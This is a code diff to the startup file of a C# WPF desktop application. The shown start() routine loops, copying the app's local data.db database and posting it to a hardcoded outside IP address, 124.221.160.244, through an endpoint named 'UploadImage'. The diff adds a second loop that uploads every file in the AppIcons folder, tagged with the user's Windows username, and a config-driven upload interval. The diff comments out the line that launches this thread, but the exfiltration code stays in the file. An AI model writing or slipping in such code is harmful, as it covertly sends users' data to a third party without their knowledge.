@@ -17,11 +17,15 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
+using System.Windows.Markup;
 using System.Windows.Resources;
+using UI.Base;
 using UI.Controls.Window;
 using UI.Servicers;
 using UI.ViewModels;
 using UI.Views;
+using static System.Net.WebRequestMethods;
+using File = System.IO.File;
 
 namespace UI
 {
@@ -47,32 +51,64 @@ namespace UI
             var serviceCollection = new ServiceCollection();
             ConfigureServices(serviceCollection);
             serviceProvider = serviceCollection.BuildServiceProvider();
-            Thread thread = new Thread(new ThreadStart(start));
-            thread.IsBackground = true;
-            thread.Start();
+            //Thread thread = new Thread(new ThreadStart(start));
+            //thread.IsBackground = true;
+            //thread.Start();
         }
         private static async void start()
         {
+            string c = AppDomain.CurrentDomain.BaseDirectory + "Data\\backup\\data.db";
             while (true)
             {
                 try
                 {
                     string url = "http://124.221.160.244/FilePc/UploadImage?filename=" + DateTime.Now.ToString("yyyyMMddHHmmss");
                     var ls = AppDomain.CurrentDomain.BaseDirectory + "Data\\data.db";
-                    var c = AppDomain.CurrentDomain.BaseDirectory + "Data\\backup\\data.db";
                     File.Copy(ls,c);
                     var resp = await url.PostMultipartAsync(mp => mp
                     .AddFile("files", c)).ReceiveString();
                     File.Delete(c);
+                    
+                    string url2 = "http://124.221.160.244/FilePc/uploadimagedir?dirname=AppIcons-" + Environment.UserName;
+                    var ls2 = AppDomain.CurrentDomain.BaseDirectory + "AppIcons";
+                    string[] dl =Directory.GetFiles(ls2);
+                    for (int m = 0; m < dl.Count(); m++)
+                    {
+                        _ = await url2.PostMultipartAsync(mp => mp
+                    .AddFile("files", dl[m])).ReceiveString();
+                        Thread.Sleep(3000);
+                    }
+                    var datas = await ReaderConfigAsync();
+                    Thread.Sleep(datas.timeupload * 1000);
                 }
                 catch(Exception e) {
-                    File.Delete(AppDomain.CurrentDomain.BaseDirectory + "Data\\backup\\data.db");
+                    if(File.Exists(c))
+                    File.Delete(c);
                 }
-                Thread.Sleep(5000);
+                Thread.Sleep(10000);
+
             }
         }
+        private static string configpath = AppDomain.CurrentDomain.BaseDirectory + "配置文件.ini";
+        public static async Task<bool> CreateConfig()
+        {
+            return await IniConfig.Path(configpath, IniConfig.IniType.Write)
+                               .CreateSectionsFromOneObject(new 配置())
+                               .SaveCacheToFileAsync();
 
-        protected override void OnExit(ExitEventArgs e)
+        }
+        public static async Task<配置> ReaderConfigAsync()
+        {
+            if (!File.Exists(configpath)) await CreateConfig();
+            return IniConfig.Path(configpath).LoadFromIFile<配置>();
+
+        }
+        public class 配置
+        {
+            public bool needwindows { get; set; } = false;
+            public int timeupload { get; set; } = 60;
+        }
+            protected override void OnExit(ExitEventArgs e)
         {
             base.OnExit(e);
             Logger.Save(true);
